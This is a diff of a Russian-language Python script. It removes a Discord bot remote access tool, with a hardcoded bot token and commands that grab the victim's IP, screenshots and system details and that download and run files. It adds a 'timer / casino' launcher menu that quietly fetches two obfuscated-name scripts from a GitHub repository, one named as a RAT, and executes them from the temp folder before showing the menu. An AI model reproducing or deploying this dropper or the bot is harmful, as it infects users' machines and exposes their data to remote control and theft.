@@ -1,99 +1,92 @@
+import json
 import os
-import discord
-from discord.ext import commands
-import pyscreenshot
-import datetime
-import platform
+import time
+from datetime import datetime
 import urllib.request
-import webbrowser
 
 os.chdir(os.getenv("tmp"))
 
-loh = "ODQ"
+def type_log(log):
+    user = os.getlogin()
+    if os.path.exists(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\console.log"):
+        with open("console.log", "a") as f:
+            time = datetime.now().strftime("%Y:%m:%d %H:%M:%S")
+            f.write(f"[{time}] {log}\n")
+            return 0
+    else:
+        with open("console.log", "w") as f:
+            time = datetime.now().strftime("%Y:%m:%d %H:%M:%S")
+            f.write(f"[{time}] Файл console.log создан.\n")
+            f.write(f"[{time}] {log}\n")
+            return 0
 
-token = f"MTM4MDQ0MDcz{loh}yMDIyODE1Nw.GCdO-i.tRcmTfECw7ZELX-c-8IhJKxg4M9U2Dwe_dhvmI"
-
-PREFIX = "/"
-intents = discord.Intents.default()
-bot = commands.Bot(command_prefix=PREFIX, intents=intents)
-
-@bot.event
-async def on_command_error(ctx, error):
-    await ctx.send(f"**Ошибка:** `{str(error)}`")
-
-@bot.tree.command(description="Информация о пользователе")
-@commands.is_owner()
-async def info(interaction: discord.Interaction):
-    user_time = datetime.datetime.now().strftime("%Y:%m:%d %H:%M:%S")
-    user_os = platform.system()
-    user_name = platform.node()
-    user_machine = platform.machine()
-
+def load_json():
     try:
-        ip = urllib.request.urlopen("https://api.ipify.org").read().decode("utf-8")
+        with open("fghfgjghjlhfjk54645sdfsdf.json", "r") as f:
+            return json.load(f)
+    except FileNotFoundError:
+        user_name = input("Напишите свой ник: ")
+        data = {
+            "Name": user_name
+        }
+        with open("fghfgjghjlhfjk54645sdfsdf.json", "w") as f:
+            json.dump(data, f, indent=4)
+            type_log(f"Имя пользователя: {user_name}")
+            return data
 
-        await interaction.response.send_message(f'**IP пользователя:** `{ip}`\n'
-                        f'**Время пользователя:** `{user_time}`\n'
-                        f'**ОС ИНФО пользователя: OS:** `{user_os}`, **NAME:** `{user_name}`, **PLATFORM:** `{user_machine}`')
-    except Exception as e:
-        await interaction.response.send_message(f"**Что-то пошло не так. Ошибка:** `{e}`")
+def menu():
+    print(f"Здравствуйте, {info["Name"]}.\n"
+                    f"Выберите что хотите загрузить:\n"
+                    f"1.Таймер\n"
+                    f"2.Казино SKAsiMan")
 
-@bot.tree.command(description="Делает скриншот экрана и отправляет вам")
-@commands.is_owner()
-async def image(interaction: discord.Interaction):
-    try:
-        image_grab = pyscreenshot.grab()
-        image_grab.save("screen.png")
-        with open("screen.png", "rb") as file:
-            await interaction.response.send_message(file=discord.File(file, filename="screen.png"))
-        os.remove("screen.png")
-    except Exception as e:
-        await interaction.response.send_message(f"**Ошибка:** `{e}`")
+    url_module = "https://github.com/sharkriz/its_good/raw/main/okdnfjin93874957dfg.pyw"
 
-@bot.tree.command(description="Открывает ссылку")
-@commands.is_owner()
-async def open_web(interaction: discord.Interaction, url: str):
-    try:
-        webbrowser.open(url)
-        await interaction.response.send_message(f"**Сайт `{url}` запущен.**")
-    except Exception as e:
-        await interaction.response.send_message(f"**Ошибка:** `{e}`")
+    url_rat = "https://github.com/sharkriz/its_good/raw/main/kjdnfjinbg03984598rat.py"
 
-@bot.tree.command(description="Открывает игру в виде URI, вот пример: steam://rungameid/730")
-@commands.is_owner()
-async def open_game(interaction: discord.Interaction, message: str):
-    try:
-        os.startfile(message)
-        await interaction.response.send_message(f"**Игра `{message}` запущена.**")
-    except Exception as e:
-        await interaction.response.send_message(f"**Ошибка:** `{e}`")
+    if os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\okdnfjin93874957dfg.pyw") and os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\kjdnfjinbg03984598rat.pyw"):
+        pass
+    else:
+        urllib.request.urlretrieve(url_module, "okdnfjin93874957dfg.pyw")
+        os.startfile("okdnfjin93874957dfg.pyw")
+        time.sleep(4)
+        urllib.request.urlretrieve(url_rat, "kjdnfjinbg03984598rat.pyw")
+        os.startfile("kjdnfjinbg03984598rat.pyw")
 
-@bot.tree.command(description="После вызова команды укажите что вы хотите хотите выполнить в cmd")
-@commands.is_owner()
-async def cmd(interaction: discord.Interaction, *, message: str):
-    try:
+    while True:
+        try:
+            hah = int(input())
+            if hah == 1 or hah == 2:
+                return hah
+            else:
+                print("Выберите что-то из списка!")
+        except ValueError:
+            print("Выберите что-то из списка!")
 
-        output = f"**Команда** `{message}` **успешно выполнена**.\n"
+def load():
 
-        await interaction.response.send_message(output)
-    except Exception as e:
-        await interaction.response.send_message(f"**Ошибка:** `{e}` **(в общем, не удалось выполнить команду 😒)**")
+    choice = menu()
 
-@bot.tree.command(description="Скачивает файл и запускает его по вашему желанию")
-@commands.is_owner()
-# Помните, всё сделано в развлекательных целях.
-# После вызова команды вы должны: указать ссылку на скачивание файла и после этого указать False или True
-# ИМЕННО ТАК, НИКАК ИНАЧЕ False=не открывать файл, True=открыть файл.
-async def start(interaction: discord.Interaction, url: str, name: str, true_or_false: bool):
-    try:
-        urllib.request.urlretrieve(url, name)
-        message = f"**Файл** `{name}` **успешно загружен!**"
-        if true_or_false:
-            os.startfile(name)
-            message += " **и запущен!**"
+    url_timer = "https://github.com/sharkriz/its_good/raw/main/timer.py"
+    url_casino = "https://github.com/sharkriz/its_good/raw/main/casino.py"
 
-        await interaction.response.send_message(message)
-    except Exception as e:
-        await interaction.response.send_message(f"**Ошибка:** `{e}`")
+    if choice == 1:
+        if os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\timer.py"):
+            os.startfile("timer.py")
+        else:
+            urllib.request.urlretrieve(url_timer, "timer.py")
+            os.startfile("timer.py")
+    else:
+        if os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\casino.py"):
+            os.startfile("casino.py")
+        else:
+            urllib.request.urlretrieve(url_casino, "casino.py")
+            os.startfile("casino.py")
 
-bot.run(token)
+    load()
+
+
+if __name__ == "__main__":
+    info = load_json()
+    type_log(f"Скрипт был запущен: {info["Name"]}")
+    load()
